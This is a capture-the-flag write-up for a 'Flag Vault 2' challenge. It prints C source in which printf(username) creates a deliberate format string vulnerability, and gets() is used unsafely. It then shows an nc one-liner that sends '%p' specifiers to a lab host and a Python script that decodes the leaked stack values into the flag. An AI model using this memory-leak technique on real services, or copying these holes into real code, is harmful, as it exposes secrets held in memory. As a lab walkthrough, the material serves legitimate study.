How did you do that? No worries. I'll adjust a couple of lines of code so you won't be able to get the flag anymore. This time, for real. Here's the source code once again

---
code source : 
```C
#include <stdio.h>
#include <string.h>

void print_banner(){
	printf( "  ______ _          __      __         _ _   \n"
 		" |  ____| |         \\ \\    / /        | | |  \n"
		" | |__  | | __ _  __ \\ \\  / /_ _ _   _| | |_ \n"
		" |  __| | |/ _` |/ _` \\ \\/ / _` | | | | | __|\n"
		" | |    | | (_| | (_| |\\  / (_| | |_| | | |_ \n"
		" |_|    |_|\\__,_|\\__, | \\/ \\__,_|\\__,_|_|\\__|\n"
		"                  __/ |                      \n"
		"                 |___/                       \n"
		"                                             \n"
		"Version 2.1 - Fixed print_flag to not print the flag. Nothing you can do about it!\n"
		"==================================================================\n\n"
	      );
}

void print_flag(char *username){
        FILE *f = fopen("flag.txt","r");
        char flag[200];

        fgets(flag, 199, f);
        //printf("%s", flag);
	
	//The user needs to be mocked for thinking they could retrieve the flag
	printf("Hello, ");
	printf(username);
	printf(". Was version 2.0 too simple for you? Well I don't see no flags being shown now xD xD xD...\n\n");
	printf("Yours truly,\nByteReaper\n\n");
}

void login(){
	char username[100] = "";

	printf("Username: ");
	gets(username);

	// The flag isn't printed anymore. No need for authentication
	print_flag(username);
}

void main(){
	setvbuf(stdin, NULL, _IONBF, 0);
	setvbuf(stdout, NULL, _IONBF, 0);
	setvbuf(stderr, NULL, _IONBF, 0);

	// Start login process
	print_banner();
	login();

	return;
}
```

- in this version , the `login()` function calls `print_flag()` without any authentication.

- The `print_flag` function no longer prints the flag but still reads it into memory. The vulnerability lies in this line:

```c
printf(username);
```

User input is passed directly to `printf`, creating a **format string vulnerability**. 
### **Exploitation :**

 - we can use format string specifiers (such as %p or %s) to leak memory contents from the stack. Since the flag was read into memory (in the local variable flag), it is likely stored on the stack nearby. 
 - so, we can use following command : `python3 -c 'print("%p "*15)' | nc 10.10.165.100 1337` 
 >output

![](https://github.com/zakaria-mghili/writeups_HackfinityBattle_2025/blob/6af508656b4da17bacb5ec6e89d89622d3ab3fbb/img/falgVault2.png)

- in the output, look like a few stack values from the memory, let's try to convert it into a readable form (they are a hexadecimal value )
- the tow value have a readable value is :
	- 0x6d726f667b4d4854 --> mrof{MHT
	- 0x65757373695f7461 --> eussi_ta
- it's written in reverse order (possibly from a memory leak due to little-endian representation).

---

- To automate this we can use this script: 
 ```python
import struct

hex_values = ["7ffc7a66ce60","7f2dc46ad887","7","562b82dd2480","7ffc7a66f218","7ffc7a66f080","7f2dc47b0600","562b82dd22a0","6d726f667b4d4854","65757373695f7461","a7d73","7f2dc4626d96","7f2dc47afa00"]

flag = "".join([struct.pack("<Q", int(h, 16)).decode(errors="ignore") for h in hex_values])
print(flag)
```

>output 
```
`fzj-$݂+Vfzfz{-"݂+VTHM{format_issues}
mb-z-
```

so the flag is `THM{format_issues}`

